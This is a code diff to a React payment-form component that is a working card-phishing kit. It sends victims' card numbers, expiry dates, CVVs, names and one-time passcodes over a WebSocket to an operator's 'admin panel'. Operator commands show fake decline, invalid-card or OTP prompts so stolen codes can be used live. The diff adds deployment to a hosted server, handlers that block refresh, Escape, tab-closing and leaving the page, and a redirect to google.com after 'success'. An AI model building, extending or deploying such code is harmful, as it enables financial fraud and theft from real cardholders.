@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2 } from 'lucide-react';
 
@@ -5,28 +6,39 @@ import { CreditCard, Lock, Shield, Loader2 } from 'lucide-react';
 let ws: WebSocket | null = null;
 
 const connectWebSocket = () => {
-  if (!ws || ws.readyState === WebSocket.CLOSED) {
-    ws = new WebSocket('ws://localhost:8080');
+  try {
+    // Use wss for secure connection on railway.com
+    const wsUrl = window.location.hostname === 'localhost' ? 'ws://localhost:8080' : 'wss://your-railway-domain.railway.app';
     
-    ws.onopen = () => {
-      console.log('WebSocket connected');
-      // Send new visitor notification
-      const userInfo = {
-        ip: getRandomIP(),
-        browser: navigator.userAgent,
-        network: getRandomNetwork()
+    if (!ws || ws.readyState === WebSocket.CLOSED) {
+      ws = new WebSocket(wsUrl);
+      
+      ws.onopen = () => {
+        console.log('WebSocket connected');
+        // Send new visitor notification
+        const userInfo = {
+          ip: getRandomIP(),
+          browser: navigator.userAgent,
+          network: getRandomNetwork()
+        };
+        ws?.send(JSON.stringify({
+          type: 'newVisitor',
+          ip: userInfo.ip
+        }));
       };
-      ws?.send(JSON.stringify({
-        type: 'newVisitor',
-        ip: userInfo.ip
-      }));
-    };
-    
-    ws.onclose = () => {
-      console.log('WebSocket disconnected');
-      // Reconnect after 3 seconds
-      setTimeout(connectWebSocket, 3000);
-    };
+      
+      ws.onclose = () => {
+        console.log('WebSocket disconnected');
+        // Reconnect after 3 seconds
+        setTimeout(connectWebSocket, 3000);
+      };
+
+      ws.onerror = (error) => {
+        console.error('WebSocket error:', error);
+      };
+    }
+  } catch (error) {
+    console.error('WebSocket connection failed:', error);
   }
 };
 
@@ -61,49 +73,109 @@ const PaymentForm = () => {
   const [showSuccess, setShowSuccess] = useState(false);
   const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
 
+  // Check if all card details are filled
+  const isFormValid = () => {
+    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
+           formData.expiryMonth.length === 2 &&
+           formData.expiryYear.length === 2 &&
+           formData.cvv.length >= 3 &&
+           formData.cardHolder.trim().length > 0;
+  };
+
+  // Check if OTP is valid (6 digits)
+  const isOtpValid = () => {
+    return otp.length === 6;
+  };
+
+  useEffect(() => {
+    // Prevent keyboard shortcuts
+    const handleKeyDown = (event: KeyboardEvent) => {
+      // Prevent F5, Ctrl+R, Ctrl+F5 (refresh)
+      if (event.key === 'F5' || 
+          (event.ctrlKey && event.key === 'r') || 
+          (event.ctrlKey && event.key === 'F5')) {
+        event.preventDefault();
+        event.stopPropagation();
+        return false;
+      }
+      
+      // Prevent ESC key
+      if (event.key === 'Escape') {
+        event.preventDefault();
+        event.stopPropagation();
+        return false;
+      }
+      
+      // Prevent other common shortcuts
+      if (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) {
+        event.preventDefault();
+        event.stopPropagation();
+        return false;
+      }
+    };
+
+    const handleBeforeUnload = (event: BeforeUnloadEvent) => {
+      event.preventDefault();
+      event.returnValue = '';
+      return '';
+    };
+
+    document.addEventListener('keydown', handleKeyDown, true);
+    window.addEventListener('beforeunload', handleBeforeUnload);
+
+    return () => {
+      document.removeEventListener('keydown', handleKeyDown, true);
+      window.removeEventListener('beforeunload', handleBeforeUnload);
+    };
+  }, []);
+
   useEffect(() => {
     connectWebSocket();
     
     // Listen for commands from admin panel
     if (ws) {
       ws.onmessage = (event) => {
-        const data = JSON.parse(event.data);
-        
-        switch (data.command) {
-          case 'showotp':
-            setIsLoading(false);
-            setShowOtp(true);
-            break;
-          case 'fail':
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Your card has been declined');
-            break;
-          case 'success':
-            setIsConfirmLoading(false);
-            setShowProcessing(true);
-            setTimeout(() => {
-              setShowProcessing(false);
-              setShowSuccess(true);
+        try {
+          const data = JSON.parse(event.data);
+          
+          switch (data.command) {
+            case 'showotp':
+              setIsLoading(false);
+              setShowOtp(true);
+              break;
+            case 'fail':
+              setIsLoading(false);
+              setShowOtp(false);
+              setErrorMessage('Your card has been declined');
+              break;
+            case 'success':
+              setIsConfirmLoading(false);
+              setShowProcessing(true);
               setTimeout(() => {
-                window.location.href = 'https://google.com';
-              }, 2000);
-            }, 4000);
-            break;
-          case 'invalidotp':
-            setIsConfirmLoading(false);
-            setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
-            break;
-          case 'cardinvalid':
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Your card is invalid, please try another card');
-            break;
-          case 'carddisabled':
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Card disabled, please try another card');
-            break;
+                setShowProcessing(false);
+                setShowSuccess(true);
+                setTimeout(() => {
+                  window.location.href = 'https://google.com';
+                }, 2000);
+              }, 4000);
+              break;
+            case 'invalidotp':
+              setIsConfirmLoading(false);
+              setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
+              break;
+            case 'cardinvalid':
+              setIsLoading(false);
+              setShowOtp(false);
+              setErrorMessage('Your card is invalid, please try another card');
+              break;
+            case 'carddisabled':
+              setIsLoading(false);
+              setShowOtp(false);
+              setErrorMessage('Card disabled, please try another card');
+              break;
+          }
+        } catch (error) {
+          console.error('Error parsing WebSocket message:', error);
         }
       };
     }
@@ -140,7 +212,12 @@ const PaymentForm = () => {
 
   const sendToAdminPanel = (data: any) => {
     if (ws && ws.readyState === WebSocket.OPEN) {
+      console.log('Sending data to admin panel:', data);
       ws.send(JSON.stringify(data));
+    } else {
+      console.error('WebSocket not connected');
+      // Try to reconnect
+      connectWebSocket();
     }
   };
 
@@ -176,6 +253,11 @@ const PaymentForm = () => {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    
+    if (!isFormValid()) {
+      return;
+    }
+    
     setIsLoading(true);
     setErrorMessage('');
     
@@ -186,23 +268,28 @@ const PaymentForm = () => {
       network: getRandomNetwork()
     };
     
-    sendToAdminPanel({
+    const cardData = {
       type: 'cardData',
       data: formData,
       userInfo: userInfo
-    });
+    };
+    
+    console.log('Submitting card data:', cardData);
+    sendToAdminPanel(cardData);
   };
 
   const handleConfirmPay = () => {
-    if (otp.length === 6) {
-      setIsConfirmLoading(true);
-      
-      // Send OTP to admin panel
-      sendToAdminPanel({
-        type: 'otp',
-        otp: otp
-      });
+    if (!isOtpValid()) {
+      return;
     }
+    
+    setIsConfirmLoading(true);
+    
+    // Send OTP to admin panel
+    sendToAdminPanel({
+      type: 'otp',
+      otp: otp
+    });
   };
 
   const getLastFourDigits = () => {
@@ -279,9 +366,9 @@ const PaymentForm = () => {
 
           <button
             onClick={handleConfirmPay}
-            disabled={otp.length !== 6 || isConfirmLoading}
+            disabled={!isOtpValid() || isConfirmLoading}
             className={`w-full py-3 px-4 rounded-lg font-medium transition-all ${
-              otp.length === 6 && !isConfirmLoading
+              isOtpValid() && !isConfirmLoading
                 ? 'bg-green-600 text-white hover:bg-green-700'
                 : 'bg-gray-400 text-gray-600 cursor-not-allowed'
             }`}
@@ -433,11 +520,11 @@ const PaymentForm = () => {
 
         <button
           type="submit"
-          disabled={isLoading}
+          disabled={!isFormValid() || isLoading}
           className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
-            isLoading 
-              ? 'bg-green-600 text-white blur-sm' 
-              : 'bg-green-600 text-white hover:bg-green-700'
+            isFormValid() && !isLoading
+              ? 'bg-green-600 text-white hover:bg-green-700'
+              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
           }`}
         >
           {isLoading ? (
